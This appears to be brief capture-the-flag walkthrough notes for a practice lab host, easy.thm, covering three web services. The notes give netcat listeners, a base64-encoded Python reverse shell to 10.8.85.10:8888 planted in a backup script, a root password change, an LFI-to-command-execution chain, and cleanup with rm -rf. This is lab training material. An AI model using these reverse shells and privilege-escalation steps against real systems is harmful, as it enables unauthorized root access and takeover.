# H1 Easy
## Port 8002
1. `nc -nvlp 45455`
2. `http://easy.thm:8002/lesson/1`
3. Paste PHP reverse shell of pentest monkey
4. `nc -nvlp 8888`
```
echo cHl0aG9uMyAtYyAnaW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pO3MuY29ubmVjdCgoIjEwLjguODUuMTAiLDg4ODgpKTtvcy5kdXAyKHMuZmlsZW5vKCksMCk7IG9zLmR1cDIocy5maWxlbm8oKSwxKTtvcy5kdXAyKHMuZmlsZW5vKCksMik7aW1wb3J0IHB0eTsgcHR5LnNwYXduKCJiYXNoIikn | base64 -d > /home/serv3/backups/backup.sh&
```

6. `passwd` and change root password
7. `rm -rf /home/serv3/backups/backup.sh`
## Port 8000
1. http://easy.thm:8000/vbcms
2. Code execution as serv1


## Port 8001
1. Upload .jpg file
2. Local LFI to command exec
